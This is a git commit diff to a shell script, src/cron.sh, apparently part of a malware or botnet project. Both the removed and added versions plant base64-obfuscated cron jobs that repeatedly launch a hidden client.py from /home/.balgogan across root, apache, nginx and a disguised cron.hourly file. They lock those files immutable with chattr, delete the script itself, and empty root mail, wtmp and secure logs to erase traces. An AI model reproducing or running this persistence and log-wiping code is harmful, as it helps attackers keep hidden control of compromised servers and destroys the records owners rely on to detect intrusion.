08aed0d9f0adac80c5adefb141585c3ec5016752
Chocapikk <balgogan@protonmail.com>
2022-06-23 21:56:11 +0200

    fixed my brain again

--- src/cron.sh
+++ src/cron.sh
@@ -1,41 +1,23 @@
-#!/bin/bash
-SHELL=/bin/bash
-PATH=/sbin:/bin:/usr/sbin:/usr/bin
 PWD=$(pwd)
-
-unlock(){
-    chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /home/.balgogan/src/*
-
-}
-
-lock(){
-     rm -rf $PWD/cron.sh
-    chattr +ai -V /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /home/.balgogan/src/*
-
-}
-
-makecron(){
-    unlock
-    echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" | crontab -
-    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" | crontab -
-    echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/root
-    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/root
-    echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/apache
-    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/apache
-    echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/nginx
-    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/nginx
-    echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/root
-    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/root
-    echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/crontabs/root
-    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/crontabs/root
-    echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.hourly/oanacroner1
-    echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.hourly/oanacroner1
-    lock
-}
-
-
-makecron
-
+chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1
+chattr -ia /home/.balgogan/src/*
+echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" | crontab -
+echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" | crontab -
+echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/root
+echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/root
+echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/apache
+echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/apache
+echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.d/nginx
+echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.d/nginx
+echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/root
+echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/root
+echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /var/spool/cron/crontabs/root
+echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /var/spool/cron/crontabs/root
+echo -e "*/1 * * * * echo cHl0aG9uMyAvaG9tZS8uYmFsZ29nYW4vc3JjL2NsaWVudC5weSAK | base64 -d | bash" > /etc/cron.hourly/oanacroner1
+echo -e "*/10 * * * * echo cGtpbGwgLTkgcHl0aG9uMzsgcGtpbGwgLTkgY2xpZW50LnB5Cg== | base64 -d | bash" >> /etc/cron.hourly/oanacroner1
+rm -rf $PWD/cron.sh
+chattr +ai -V /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 
+chattr +ia /home/.balgogan/src/*
 echo 0>/var/spool/mail/root
 echo 0>/var/log/wtmp
 echo 0>/var/log/secure
